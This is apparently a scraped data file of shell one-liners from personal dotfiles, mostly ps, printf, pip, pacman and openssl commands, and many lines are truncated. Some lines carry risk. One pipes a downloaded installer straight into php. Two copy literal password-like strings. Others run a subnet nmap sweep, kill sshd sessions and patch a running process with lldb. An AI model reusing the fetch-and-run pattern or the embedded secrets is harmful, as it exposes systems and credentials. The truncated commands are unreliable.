"ps axch -o cmd:16,%mem --sort=-%mem | sed ""s/$/ %/; 11q"""
"ps axch -o cmd:15,%mem --sort=-%mem | head"
"ps axch -o cmd:15,%cpu --sort=-%cpu | head"
"ps axch -o cmd,%mem --sort=-%mem | head"
"ps axch -o cmd,%mem --sort=-%mem | head -n 10"
"ps axch -o cmd,%mem --sort=-%cpu | head"
"ps axch -o cmd,%cpu --sort=-%cpu | head"
"ps axch -o cmd,%cpu --sort=-%cpu | head -n 10"
"ps axc -o cmd:15,%mem --sort=-%mem| head"
"ps axc -o cmd:15,%cpu --sort=-%cpu | head"
"ps ax | grep ""ssh.*[0-9]:.*:[0-9]"""
"ps ax | grep ""[r]uby"""
"ps ax -o pid,comm |grep "
"ps ax -f | grep -v ""0:00 \[.*\]"""
"ps aux|grep ""root"""
"ps auxf | perl -pe 's/^\\s*(\\d+)/sprintf qq{%-10s}, substr(scalar(getpwuid(\$1)), 0, 10)/e;'"
"ps auxf | grep -v ""^[ ]*root"""
"ps auxf | grep -v ""0.[0-9] 0"""
"ps aux | vim -c ""set filetype=ps"" -"
"ps aux | sort -rn -k 5,6"
"ps aux | sort -nrk 3,3"
"ps aux | rg -i"""
"ps aux | grep -v ""\["""
"ps aux | grep -i ""bin\/lein vimclojure"""
"ps aux | grep -E ""$USER.+bin"""
"ps aux | grep ""ssh -fN"""
"ps aux | grep ""plug run"""
"ps aux | grep ""^zwang40"""
"ps aux | grep ""\bvim\?\b"""
"ps aux | awk -F "" "" "
"ps aux | awk ""{sum +=\$6}; END {print sum}"""
"ps aux --width ""$COLUMNS"" --sort -%mem | head -10"
"ps aux --width ""$COLUMNS"" --sort -%cpu | head -10"
"ps aux --sort -rss | awk -F' ' 'NR>1{SUM+=\$4}END{print SUM, 80}'"
"ps arcxo pid,pcpu,pmem,user,command | head -10"
"ps amcxo pid,pcpu,pmem,user,command | head -10"
"ps al | grep "" Z """
"ps afxu|grep -E ""^$(whoami)"""
"ps afxu| vim +""set bt=nowrite nowrap"" -"
"ps Haxwwo stat,pid,ppid,user,wchan:25,command | grep -e ""^STAT"" -e ""^D"" -e ""^Z"""
"ps Ao pid,comm|ruby -e 'puts STDIN.read.gsub(/^ *(\d+) .*?([^\/]+?$)/,\"
"ps -wAo pid,user,lstart,args|less -S"
"ps -wAo pid,user,lstart,args --sort start_time|less -S"
"ps -u root U `whoami` --forest -o pid,stat,tty,user,command |ccze -m ansi"
"ps -u $USER -o pid,%cpu,%mem,bsdtime,command | awk "
"ps -u $LOGNAME -o pid,rss,command | sort -n +1 -2"
"ps -u ""$(echo $(w -h | cut -d i\"
"ps -p $(ps hf -o pid -C terminus | head -n1) -o %cpu,%mem,cmd"
"ps -opid,command |grep "
"ps -o user,pid,rss,stat,time,command -Aww |tail -n30"
"ps -o user,pid,ppid,command -ax | grep"
"ps -o time,ppid,pid,nice,pcpu,pmem,user,comm -A | sort -n -k 6"
"ps -o time,ppid,pid,nice,pcpu,pmem,user,comm -A | sort -n -k 5"
"ps -o rss,command -waxc | sort -n"
"ps -o ppid,pid,euser,stat,%cpu,rss,args | head -n 1; \
"ps -o pid,user,%mem,command ax | sort -b -k3 -r"
"ps -o pid,ppid | grep"
"ps -o pid,pgid,command -e | grep "
"ps -o comm,rss,vsz | grep $1"
"ps -o %cpu,%mem,user,pid,rss,stat,time,command -Aww |sort -k1n"
"ps -fC sshd | awk ""/@notty/ { print \""kill \""$2; }"""
"ps -ero pid=PID,%cpu=CPU,%mem=MEM,comm=CMD | head -15"
"ps -eo user:20,pid,cmd | grep"
"ps -eo user,pid,tid,class,rtprio,ni,pri,psr,pcpu,vsz,rss,pmem,stat,wchan:28,cmd|less"
"ps -eo user,pid,ppid,tty,cmd:200 | grep -v ' \['"
"ps -eo user,pid,ppid,pcpu,pmem,nlwp,psr,start_time,etime,stat,wchan:14,cmd --sort=-pcpu,-pmem,-nlwp | egrep -v "" 0.[0-9] 0.[0-9] """
"ps -eo user,pid,ppid,cmd:75,%mem,%cpu --sort=-%mem | head -n 15"
"ps -eo user,pid,ni,%cpu,%mem,vsz,tty,stat,lstart,time,args --forest | less -S"
"ps -eo user,pid,command | rg -i"
"ps -eo user,pid,%cpu,%mem,vsz,rss,tty,stat,lstart,etime,command --sort=%cpu |grep java"
"ps -eo uname,pid,comm,pmem,rss --sort -rss | head -n 11"
"ps -eo uname,pid,comm,pcpu --sort -pcpu | head -n 11"
"ps -eo uname,%cpu,%mem,fname,pid | sort -nk3"
"ps -eo uname,%cpu,%mem,fname,pid | sort -nk2"
"ps -eo size,pid,user,command | awk "
"ps -eo size,pid,user,command --sort -size | awk '{ hr=\$1/1024 ; printf(\"
"ps -eo size,pid,user,command --sort -size | awk '{ hr=$1/1024 ; printf(\"
"ps -eo size,pid,user,command --sort -size | awk '{ hr=$1/1024 ; printf("
"ps -eo size,pid,user,command --sort -size | awk "
"ps -eo s,pid,ucmd:12,time,cp,etime,pmem --sort=-time,-cp | head"
"ps -eo s,pid,ucmd:12,cp,etime,pmem,rss,pcpu --sort=-pmem,-rss | head"
"ps -eo rss,pid,user,command | awk '{ hr=\$1/1024 ; printf(\"
"ps -eo rss,pid,user,command --sort -size|awk '{ hr=\$1/1024 ; sum=hr+sum; print \$0 }END{print \"
"ps -eo rss,pid,args | awk '{ \$1 = int(\$1/1024); if(\$1 > 0){ printf \"
"ps -eo pmem,pcpu,rss,vsize,args | sort -k 1"
"ps -eo pmem,args --sort=-%mem | head"
"ps -eo pid,user,uid,group,gid,vsz,rss,comm | less"
"ps -eo pid,user,pcpu,pmem,comm --sort -pmem | head -20"
"ps -eo pid,user,pcpu,pmem,comm --sort -pcpu | head -20"
"ps -eo pid,user,ni,%cpu,%mem,time,etime,start,comm | grep -e PID -e"
"ps -eo pid,user,command | grep"
"ps -eo pid,user,args | grep vnc"
"ps -eo pid,uid,pcpu,command | sort -rk 3"
"ps -eo pid,tty,user,comm,stime,etime,cmd | grep "
"ps -eo pid,tid,class,rtprio,ni,pri,psr,pcpu,stat,wchan:14,args | grep $1"
"ps -eo pid,ruser,cmd| grep -i"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem|head"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head -20"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head -16"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head -11"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head --lines=15"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 11"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -16"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head --lines=15"
"ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head && uptime"
"ps -eo pid,pcpu,pmem,user,comm --sort -%cpu | head -10"
"ps -eo pid,pcpu,comm | awk '{if ($2 > 4) print }' >> ~/.ps_eo_test.txt"
"ps -eo pid,etime,command|grep $@"
"ps -eo pid,comm | grep "
"ps -eo pid,cmd | fzf"
"ps -eo pid,%cpu,user,command --sort -%cpu | awk 'NR<=6'"
"ps -eo pid,%cpu,user,args --sort -%cpu | awk 'NR<=6'"
"ps -eo pcpu,pid,user,args | sort -k 1 -r"
"ps -eo pcpu,args --sort=-%cpu|head"
"ps -eo pcpu,args --sort=-%cpu | head"
"ps -eo comm,pmem --sort -pmem | head"
"ps -eo comm,pid | ack -i "
"ps -eo comm,etime | grep httpd"
"ps -eo \""%p %P %U >> %a\"" | sort"
"ps -eo %mem,%cpu,comm --sort=-%mem | head -n 6"
"ps -eo ""%p %c %U %C"" | grep"
"ps -eo ""%C : %p : %z : %a""|sort -k5 -nr"
"ps -emo pid=PID,%cpu=CPU,%mem=MEM,comm=CMD | head -15"
"ps -ef|grep ""ssh -fNL"""
"ps -ef|grep ""[[:digit:]] [[:digit:]][[:digit:]]:[[:digit:]][[:digit:]] """
"ps -ef |grep -v \"" \\[\"""
"ps -ef | grep java
"ps -ef | grep -v ""^[ ]*root"""
"ps -ef | grep -i ""[x]code"""
"ps -ef | grep $USER"""
"ps -ef | grep ""tensorboard"""
"ps -ef | grep ""python"""
"ps -ef | grep ""node"""
"ps -ef | grep ""^jstn"""
"ps -ef | grep ""[0-9] ssh"""
"ps -ef | awk ""/noah/ && !/fsevent_watch/ && !/Firefox/ && !/Dropbox/ && !/Spotify/ && !/1Password/ && !/CrashPlan/"""
"ps -ef -o pid,stat,vsize,rss,time,command | head -10"
"ps -ecro ""command %cpu %mem pid rss"" | head -11"
"ps -ecmo ""command %cpu %mem pid rss"" | head -11"
"ps -eLo pid,nlwp,cmd | uniq"
"ps -eHOuser,vsize,pmem | $PAGER"
"ps -eH -o user,pid,ppid,pgid,%cpu,%mem,vsz,rss,tty,stat,etime,args | less -S"
"ps -eF |awk '/youdao-dict/{if(index(\$0, \"
"ps -eF |awk '/netease-cloud-music/{if(index(\$0, \"
"ps -e ouid,pid,ppid,pgid,sid,cgname,c,stime,tty,time,cmd --forest && ps ouid,pid,ppid,pgid,sid,cgname,c,stime,tty,time,cmd | head -n 1"
"ps -e -orss=,args= | sort -b -k1,1n"
"ps -e -o user,pid,ppid,time,cmd | grep $USER"
"ps -e -o user,pid,pcpu,rss,command | grep"
"ps -e -o size,rss,pid,cmd|sort -h"
"ps -e -o rss=,args= | sort -b -k1,1n"
"ps -e -o rss,command | awk "
"ps -e -o pmem,vsz,rss,pid,comm --sort -%mem | head -n 5"
"ps -e -o pid,vsz,comm= | sort -n -k 2"
"ps -e -o pid,ppid,user,flags,stat,wchan:16,tty,start,cmd -ww | less"
"ps -e -o pid,ppid,time,user,cmd | grep $USER"
"ps -e -o pid,command | grep"
"ps -e -o pcpu,pmem,comm,cputime,user,pid -r | tail"
"ps -e -o pcpu,pid,comm --sort -%cpu | head -n 5"
"ps -e -o pcpu,cpu,nice,state,cputime,args|sort -k1 -nr"
"ps -e -o pcpu,cpu,nice,state,cputime,args | sort -k1 -nr"
"ps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu | sed '/^ 0.0 /d'"
"ps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu | sed ""/^ 0.0 /d"""
"ps -e -o pcpu,args --sort pcpu | tail"
"ps -e -o euser,pid,args|grep"
"ps -e --user noah --format 'cmd pid %mem %cpu' --sort -%cpu,-%mem | head"
"ps -c80 -ocmd,%mem,%cpu -k-%mem -ax | head -n11"
"ps -axwwco user,pid,ppid,pgid,command | /usr/local/bin/pstree -f - $@"
"ps -axm -o 'rss,comm' | awk 'BEGIN { s=0;}; {s=s+$1;}; END { printf(\"
"ps -ax | grep ""[F]eVPN"""
"ps -ax -o pid,start,command | grep -i "
"ps -ax --sort=-%cpu,-%mem -o pid,%cpu,%mem,comm |head -n 6"
"ps -aux | grep ""rajan-01"""
"ps -amcwwwxo ""command %mem %cpu"" | head -20"
"ps -aef | grep ""rails server"""
"ps -acrx -o pid,%mem,command | awk 'NR<=5'"
"ps -acrx -o pid,%cpu,command | awk 'NR<=6'"
"ps -acrx -o pid,%cpu,command | awk 'NR<=5'"
"ps -a | grep -v ""0.00"""
"ps -a -x -o user,pid,command | grep"
"ps -a -o comm,rss,vsz | grep $1"
"ps -Axww -o pid,ruser,command | less -S"
"ps -Aro pcpu,pmem,comm,comm,pid | head -n 6"
"ps -Aopid,args | { if [ -t 1 ]; then less -F; else cat; fi; }"
"ps -Ao vsz,comm --sort=vsz | awk '{printf \"
"ps -Ao user,uid,comm,pid,pcpu,tty --sort=-pcpu | head"
"ps -Ao user,uid,comm,pid,pcpu --sort=-pcpu | head -n 6"
"ps -Ao user,pid,pcpu,comm -r | head -n 16"
"ps -Ao rss,vsz,pid,cmd --sort=-rss,-vsz | awk '{if (\$1>5000) print;}'"
"ps -Ao rss,comm --sort=rss | awk '{printf \"
"ps -Ao pid,user,comm | grep $1"
"ps -Ao pid,pcpu,size,user,args --sort=-size | head -n 10; echo"
"ps -Ao pid,pcpu,size,user,args --sort=-pcpu | head -n 10; echo"
"ps -Ao pid,pcpu,comm -r | head -n 6"
"ps -Ao pid,command | grep"
"ps -Ao pid,command | grep -i"
"ps -Ao pcpu,stat,time,pid,cmd --sort=-pcpu,-time | sed '/^ 0.0 /d'"
"ps -Ao pcpu,pmem,comm,comm,pid --sort=-pcpu | head -n 6"
"ps -Ao flags,state,user,pid,ppid,%cpu,pri,nice,paddr,rss,wchan,start,tty,time,command | sort -n -k4"
"ps -Amo user,pid,pmem,comm -r | head -n 16"
"ps -ALo pid,ppid,pcpu,wchan:16,psr,cmd:90,user --header | grep --color -C 200 PID.*USER"
"ps -A | grep ""ruby"""
"ps -A -ostat,ppid,pid,cmd | grep -e ""^[Zz]"""
"ps -A -o user,pid,ppid,start,time,args | awk "
"ps -A -o pid,ppid,user,command | grep -i "
"ps -A -o pid,comm | grep -i"
"ps -A --sort -rsz -o comm,pmem,pcpu|awk ""NR<=15"""
"ps -A --sort -rsz -o comm,pmem,pcpu | awk 'NR<=20'"
"ps -A --sort -rss -o pid,comm,pmem,rss | less"
"ps -A --sort -rss -o pid,comm,pmem,rss | head -n 11"
"ps -A --sort -rss -o comm,pmem,rss | head -n 20"
"ps --sort=""-vsz"" -eo ""user,pid,ppid,vsz,args"" | head "
"ps --sort=""-%cpu"" -eo ""user,pid,ppid,%cpu,args"" | head "
"ps --no-headers -Ao pid,tty,user,time,comm,nice | grep"
"ps --forest -weo pid,user:16,args --sort start_time|less -S"
"ps $PS_HEADER | egrep -v ""[0-9] \[.*\]"""
"ps $$ | awk ""NR == 2 && \$5 ~ /^-/ { print \""yes\""; }"""
"ps $$ | awk ""NR == 2 && \$3 ~ /s/ { print \""yes\"" }"""
"prompt-pick ask ""Pick branch"" ""$(git branch | grep -v "
"procrank | grep ""me"""
"prlctl exec ${uuid} ifconfig eth0 | egrep -o ""([[:xdigit:]]{2}[:]){5}[[:xdigit:]]{2}"""
"prints-by-person | grep ""Egg """
"printf -- ""%*s\n"" ""$(tput cols)"" "" "" | sed ""s/ /-/g"""
"printf %s ""$(< /dev/stdin)"" | xclip -selection c"
"printf %$(tput lines)s | tr "" "" ""\n""; neofetch --backend kitty --source ""$NEOFETCH_IMG"""
"printf %""$COLUMNS""s |tr "" "" ""-"""
"printf %""$(tput cols)""s |tr "" "" ""-"""
"printf $(printf ""\e[1m%%%ds\e[0m\n"" $(tput cols)) | tr "" "" ="
"printf $(printf ""\e[$(shuf -i 91-97 -n 1);1m%%%ds\e[0m\n"" ${terminfo[cols]}) | tr "" "" ="
"printf $(printf ""\e[$(shuf -i 91-97 -n 1);1m%%%ds\e[0m\n"" $(tput cols)) | tr "" "" ="
"printf ""z7927WdTjt8UgFzp2X24"" | pbcopy"
"printf ""yes\n"" | ssh -T git@github.com"
"printf ""yes\n"" | ssh -T git@bitbucket.com"
"printf ""yes\n"" | git fetch --all"
"printf ""y\n"" | docker system prune -a"
"printf ""y\n"" | docker container prune && docker_containers"
"printf ""traces of the i/o traffic on block devices\n""; blktrace -d /dev/sda -o - | blkparse -i -"
"printf ""startup"" | sqlplus / as sysdba"
"printf ""p *(char*)(void(*)())AudioDeviceDuck=0xc3\nq"" | lldb -n"
"printf ""p *(char*)(void(*)())AudioDeviceDuck=0xc3\nq"" | lldb -n QQ"
"printf ""gcloud container clusters get-credentials $CLUSTER_NAME\nkubectl config set-context \$(kubectl config current-context) --namespace=$NAMESPACE\ngcloud config set container/cluster $CLUSTER_NAME\n"" | xclip -sel clip"
"printf ""behind: %u | ahead: %u \n"" `git rev-list HEAD..origin/master --count` `git rev-list origin/master..HEAD --count`"
"printf ""\uFEFF"" | xsel -ib"
"printf ""\u200B"" | xsel-ib"
"printf ""\t"" | clip"
"printf ""\n>>> Deleting untagged volumes\n\n"" && docker volume ls -qf dangling=true | xargs -r docker volume rm"
"printf ""\n>>> Deleting untagged images\n\n"" && docker images -q -f dangling=true | xargs docker rmi"
"printf ""\n>>> Deleting stopped containers\n\n"" && docker ps -a -q | xargs docker rm"
"printf ""\n>>> Deleting dangling volumes\n\n"" && docker volume ls -q -f dangling=true | xargs docker volume rm"
"printf ""\e[1m%*s\e[0m\n"" ""${COLUMNS:-$(tput cols)}"" """" | tr "" "" -"
"printf ""\033[?7l$(git tree --color=always | head -n$(($LINES - 4)))\033[?7h"""
"printf ""Scan whole specific network for active online ips\n""; nmap -n -sn 192.168.1.0/24 -oG - | awk ""/Up$/{print $2}"""
"printf ""RAM \t CPU \t IO \t Container\n""; docker stats --no-stream --format ""{{.MemPerc}}\t{{.CPUPerc}}\t{{.BlockIO}}\t{{.Name}}"" | sort"
"printf ""Local IP:- ""; hostname -I | cut -f1 -d "" ""; printf ""Public IP:- ""; curl -s https://ipinfo.io/ip"
"printf ""Local IP:- ""; hostname -I | cut -f1 -d "" ""; printf ""Public IP Details:- \n""; geoip"
"printf ""Generate a random password 14 characters long\n""; tr -c -d ""a-zA-Z0-9"" </dev/urandom | dd bs=14 count=1 2>/dev/null;echo"
"printf ""8#44VTr!&dFs!zc"" | pbcopy"
"printf ""%s\n"" ""${(k)functions[@]}"" | sort"
"printf ""%s\n"" ""${(k)commands[@]}"" | sort"
"printf ""%s\n"" ""${(k)builtins[@]}"" | sort"
"printf ""%s\n"" ""${(k)aliases[@]}"" | sort"
"printf ""%s-%s-%s-%s\n"" $(grep -v ""[A-Z]"" /usr/share/dict/words | shuf -n 4)"
"printf ""%s"" ""༼ つ ◕_◕ ༽つ"" | pbcopy && echo ""copied to clipboard ༼ つ ◕_◕ ༽つ"""
"printf ""%s"" ""¯\_(ツ)_/¯"" | pbcopy && echo ""copied to clipboard ¯\_(ツ)_/¯"""
"printf ""%s"" ""mnh:/home/mnrmnaugh/"" | tee >(xsel -ib)"
"printf ""%s"" ""(╯°□°)╯︵ ┻━┻"" | pbcopy && echo ""copied to clipboard (╯°□°)╯︵ ┻━┻"""
"printf ""%s"" ""$IFS"" | od -bc"
"printf ""%s"" ""$(xclip -o -selection clipboard)"" | xclip -selection clipboard"
"printf ""%s"" ""$(uuidgen | tr "
"printf ""%s"" ""$(pwd)"" | pbcopy"
"printf ""%q\n"" ""$(pwd)"" | xsel"
"printf ""%q\n"" ""$(pwd)"" | xsel -b"
"printf ""%q\n"" ""$(pwd)"" | xclip -selection clipboard"
"printf ""%q\n"" ""$(pwd)"" | pbcopy"
"printf ""%q"" ""$(pwd)"" | pbcopy"
"printf ""%`tput cols`s""|tr "" "" ""#"""
"printf ""%80s\n"" |tr "" "" ""#"""
"printf ""%3d %3d %3d %3d %3d %3d %3d %3d %3d %3d\n"" $( echo {1..10}\*{1..10}\; | bc )"
"printf ""%100s\n"" | tr "" "" ="
"printf ""%*s"" ""$(tput cols)"" | tr "" "" ""-"""
"printf ""%$(tput cols)s\n""|tr "" "" ""="""
"printf ""%$(tput cols)s\n""|tr "
"printf ""%$(tput cols)s\n"" `date`|tr "" "" ""="""
"printf ""${PWD##*/} - $(find . -type f | wc -l) Files\n"""
"printf ""${PWD##*/} - $(find . -maxdepth 1 -type f | wc -l) Files\n"""
"printf ""$_"" | clip"
"printf ""$PWD"" | pbcopy"
"printf ""$(lpass show --name --username)\n$(lpass show --name --password)\ny"" | vpn -s connect "
"printf ""$(hostname):%d,%d\n%s,%d"" $(emanage -D local -u) $(emanage -D local -c) $(emanage -D remote -u) $(emanage -D remote -c | awk -F: ""{print \$2}"")"
"printf ""$(echo %3d$_{1..10})\n"" $(echo {1..10}\*{1..10}\;|bc)"
"printenv PATH | tr "":"" ""\n"""
"print_and_copy ""$(find ${HOME}/.ssh -name ""id_*.pub"" | while read file; do cat ${file}; done)"""
"print -z $(print -l ${(ok)commands} | fzf --preview=""MANWIDTH=150 man {}"" --preview-window=right:75%)"
"print -rl -- ${(ko)commands} ${(ko)functions} ${(ko)aliases} | grep -v ""^_"""
"print -l ~/.vim/bundle/vim-snippets/{snippets,UltiSnips}/* ~/.vim/UltiSnips/*|cut -d'/' -f4-"
"print -l ""$(brew --prefix)""/Cellar/${^$(brew ls)}/*/bin/*(*N) | cut -d "
"print ""cd $(pwd)"" | pbcopy"
"prev_container_id=""$(docker ps -aq | head -n1)"" && docker commit ""$prev_container_id"" ""prev_container/$prev_container_id"" && docker run -it --entrypoint=bash ""prev_container/$prev_container_id"""
"powershell -command ""[guid]::newguid().Guid""|xargs"
"postqueue -p |lgrep -E ""^[0-9A-F]*!"""
"portversion | grep ""<"""
"pmset -g log | grep -e "" Sleep "" -e "" Wake """
"pmset -g batt | egrep -o '[0-9]{1,3}%'"
"pmset -g batt | egrep ""([0-9]+\%).*"" -o --colour=auto \
"pmset -g batt | awk '/InternalBattery/ { print \$5, \$6 }'"
"pivot&&lerna clean --yes&&find ./ -name ""package-lock.json""|xargs rm -rf&&npm cache clean --force&&lerna bootstrap"
"pip3 list --outdated --format=freeze |
"pip3 install -U $(pip3 list --outdated --format=freeze | awk ""{split($0, a, \""==\""); print a[1]}"")"
"pip3 install --upgrade $(pip3 freeze | sed ""s/\(.*\)==.*/\1/g"")"
"pip3 freeze | grep -v ""pkg-resources"" > requirements.txt"
"pip install -U --user $(pip freeze | awk '{split($0, a, "
"pip install -U $(pip freeze | awk '{split($0, a, "
"pip install --user -U $(pip freeze | awk ""{split($0, a, "
"pip install --upgrade pip && pip freeze --local | grep -v \
"pip install --upgrade $(pip list -o --format=freeze | grep -oP ""^[^\s=]+"")"
"pip freeze | sed -e ""s/==/>=/g"" > ~/requirement.txt ; pip install --upgrade -r ~/requirement.txt ; rm ~/requirement.txt"
"pip freeze | sed ""s/==.*//"""
"pip freeze | grep -v ""pkg-resources"""
"pip freeze | grep -v ""pkg-resources"" > requirements.txt"
"pip freeze -r requirements.txt | grep -v ""pkg-resources"" > requirements_new.txt && mv requirements_new.txt requirements.txt"
"pip freeze -r requirements.txt | grep -v ""^#"""
"ping 8.8.8.8 | grep -o -e ""time=.*$"""
"ping 8.8.4.4 | grep -o -e ""time=.*$"""
"ping -ni8 8.8.8.8 2>&1 | grep ""bytes from"""
"ping -i 1.5 8.8.8.8 | grep -E --only-match --color=never ""[0-9\.]+ ms"""
"ping -c1 66.33.205.240 && ifconfig | grep 127.0.0.2 && echo ""ALL GOOD!"""
"ping -c 2 google.com | grep ""% packet loss"" -C 7"
"ping -D www.google.pl | cut -d ' ' -f 1,9,10"
"ping $1 | while read pong; do echo ""$(date): $pong""; done"
"ping $(ip route show 0.0.0.0/0 | cut -d"" "" -f3 )"
"pid=$(ptree spotify | grep Watchdog ) && kill ${pid#*,}"
"picocom -b 115200 /dev/ttyUSB1 | tee ~/logs/`date +""%Y-%m-%d_%H-%M-%S""`.log"
"picocom -b 115200 /dev/ttyUSB0 | tee ~/logs/`date +""%Y-%m-%d_%H-%M-%S""`.log"
"phpcs --standard=Squiz --report=csv --extensions=php --sniffs=Generic.NamingConventions.ConstructorName . | cut -f1,2 -d,"
"php -r ""readfile(https://getcomposer.org/installer);"" | php"
"php --ini | grep -e "".ini$"""
"php $HOME/bin/dp.php | while read line; do notify-send -t 8000000 ""DPs Playlist"" ""$line""; done"
"ph; ps aux | grep "" ${tty} """
"pgrep gpg-agent |
"perl -pe ""s/([\xC2\xC3])([\x80-\xBF])/ord$1==0xC2?\$2:chr(ord\$2|0xC0)/ge"""
"perl -pe ""chomp"" | pbcopy && pbpaste"
"perl -p -e ""s/\n/\0/;"" | xargs -0"
"perl -ne ""s/\t/ /;print;""|perl -ne ""1 while s{^(\s*[^\s]+\s*)\.?/[^/]+(?=/)}{ \1}g;print;"""
"perl -e '\$f = qx/free -m |grep Mem/; chomp(\$f); \$f =~ s/.*Mem:\s+//g; @info = split(/\s+/,\$f); \$t = \$info[0]; \$fr = \$info[2]; \$b = \$info[4]; \$c = \$info[5]; \$free = \$fr+\$b+\$c; \$used = \$t-\$free; printf(\"
"perl -e ""while (<>) { s/\033\[[\d;]*[mH]//g; print; }"" | col"
"perl -e ""\$_=lc<>;\$_=~s/[-:]//g;\$_ =~ m/^(..)(..)(..)(..)(....)/;printf(\""%02x%s:%sff:fe%s:%s\n\"", ((hex \$1)|0x02), \$2, \$3, \$4, \$5);"""
"perl -a -F: -MTime::Local -ne ""\$F[1]=\"" \"".localtime(\$F[1]); print join(\"":\"", @F);"" $HISTFILE_OLD | less"
"perl -a -F: -MTime::Local -ne ""\$F[1]=\"" \"".localtime(\$F[1]); print join(\"":\"", @F);"" $HISTFILE | less"
"perl -MJSON::XS -MData::Dumper -ne 'use utf8; print Dumper( JSON::from_json( \$_ ) ), \$/;' | fix_perl_utf"
"perl -MConfig -MYAML -e ""print Dump \%Config"" | vim -"
"pdftk - output - uncompress | tr ""[\000-\011\013-\037\177-\377]"" ""²"""
"pcap=~/.pcaps/$(nn).pcapng; touch $pcap && tshark -i any --capture-comment """" -qwnlpfpcapng -w $pcap& tail -c0 -f $pcap | tshark --color -r - -c ssl "
"pbpaste |python -c ""import webbrowser, sys; map(lambda url: webbrowser.open(url.strip()), sys.stdin.readlines())"""
"pbpaste | tr ""\n"" "" """
"pbpaste | ssh htc ""termux-tts-speak -l zh_CN"""
"pbpaste | sed ""${pane_id}q;d"""
"pbook -c ""sync()"" && pbook -c ""show()"" | grep -e JobsetID -e failed -e running -e activated -e merging -e lastUpdate >& /tmp/kpbook.txt && grep -B 2 failed /tmp/kpbook.txt'"
"pbcopy < ~/.ssh/id_rsa.pub | echo ""› SSH public key copied to clipboard"""
"pbcopy < ~/.ssh/id_rsa.pub | echo ""=> SSH key was copied to the clipboard."""
"pbc ""$(ls -rt | tail -n1)"""
"paste.exe | sed ""s/
"password=""$(openssl rand -base64 8)""; echo ${password/%?/} | pbcopy; echo Copied to clipboard!"
"pass | tr "" "" "" """
"pages start dev --apps mobile,mysky | lolcat"
"pacman -Slq | fzf --preview='pacman -Si {1}; \
"pacman -Qtdq > /dev/null && sudo pacman -Rns \$(pacman -Qtdq | sed -e ':a;N;$!ba;s/
"pacman -Qtdq 1>/dev/null && sudo pacman -Rns $(pacman -Qtdq | sed -e "":a;N;\$!ba;s/\n/ /g"")"
"pacman -Qqm | grep -vx ""$(cat $HOME/bin/backup_exclude_pkgs)"" > $HOME/github/pdq/local.lst && echo $(tr -s ""\n"" "" "" < $HOME/github/pdq/local.lst)"
"pacman -Qqe | grep -vx ""$(pacman -Qqm)"" > ~.pkg.list"
"pacman -Qqe | grep -v ""$(pacman -Qqm)"""
"pacman -Qqe | grep -v ""$(pacman -Qqm)"" > pkglist_offical.txt"
"pacman -Qqe | grep -v ""$(pacman -Qqm)"" > pacman_backup.lst"
"pacman -Qqe | grep -v ""$(pacman -Qmq)"" > ~/Dropbox/pklist.txt"
"pacman -Qqe | grep -v ""$(pacman -Qmq)"" > ~/Dropbox/Freedomx/pklist-new.txt"
"pacman -Qqe | grep -v ""$(pacman -Qmq)"" > ~/Dropbox/Centurion/pklist.txt"
"pacman -Qqe | grep -v ""$(pacman -Qmq)"" > ~/Dropbox/Archer/pklist.txt"
"pacman -Qqe | grep -v ""$(pacman -Qmq)"" > ~/Dropbox/Arch/pklist.txt"
"pacman -Qqe | grep -Fvx ""$(pacman -Qqm)"""
"pacman -Qq | fzf --preview 'pacman -Qil {}' \
"pacman -Qi | gawk '/^Name/ { x = $3 }; /^Installed Size/ { sub(/Installed Size *:/, "
"pacman -Qi ""$@"" | grep ""Required By"""
"pacman -Qeq | sort \
"pacman -Qe | cut -d "" "" -f 1 > ~/Documents/Backup\ Notes/Manjaro/""$(date +""%m_%d_%Y"")_Manjaro_Installed_Packages"""
"paclog-pkglist <(tail -5000 /var/log/pacman.log | grep -A 100 -i 'pacman -Rcs') ; echo --- ; \
"paclog-pkglist <(tail -2000 /var/log/pacman.log | grep -A 3 -i 'pacman -S') ; echo --- ; \
"paclog-pkglist <(tail -100 /var/log/pacman.log | grep -A 3 -i installed) ; echo --- ; \
"paclog --color --commandline|rg -v -e ""pacman -D"" -e ""-Ud"""
"origindir=$(pwd); for repo in `find $(pwd) -type d -name "".git"" | cut -d""."" -f1`; do cd $repo; printf ""Repo:\033[0;36m $repo\033[0m - ""; git status; cd $origindir; done"
"origindir=$(pwd); for repo in `find $(pwd) -type d -name "".git"" | cut -d""."" -f1`; do cd $repo; printf ""Repo:\033[0;36m $repo\033[0m - ""; git pull; cd $origindir; done"
"openssl s_client -connect ""$1"":443 | openssl x509 -text -noout"
"openssl rand -hex 6 | sed ""s/\(..\)/\1:/g; s/.$//"""
"openssl rand -base64 48 | sed ""s/[=O/\+]//g"""
"openssl rand -base64 32|sed -E ""s:[/=\\]::g"""
"openssl rand -base64 128 | tr -d ""\n/+="""
"openssl rand -base64 ${1:-9} | xcopy ; echo ""$(xpaste)"""
"openssl rand -base64 ${1:-9} | xc ; echo ""$(xp)"""
"openssl rand -base64 ${1:-9} | pbcopy ; echo ""$(pbpaste)"""
"open_jira_issue `current_branch | grep -o ""[A-Z]\+-[0-9]\+""`"
"open https://www.google.com/search\?q\=""$(pbpaste | xargs)"""
"open https://$(ghq list | peco --prompt ""GIT REPOGITORY"")"
"open `git status --porcelain | sed -ne ""s/^ M //p""`"
"open -a ""`ls -dt /Applications/Visual\ Studio\ Code.app|head -1`"""
"open -a ""`ls -dt /Applications/IntelliJ\ IDEA*|head -1`"""
"open -a ""`ls -dt /Applications/Goland.app|head -1`"""
"open -a ""$(ls -dt ${HOME}/Library/Application\ Support/JetBrains/Toolbox/apps/IDEA-U/ch-0/*/*.app|head -1)"""
"open $(git remote get-url origin|sed ""s/^ssh/http/;s/[^/]*@//"")"
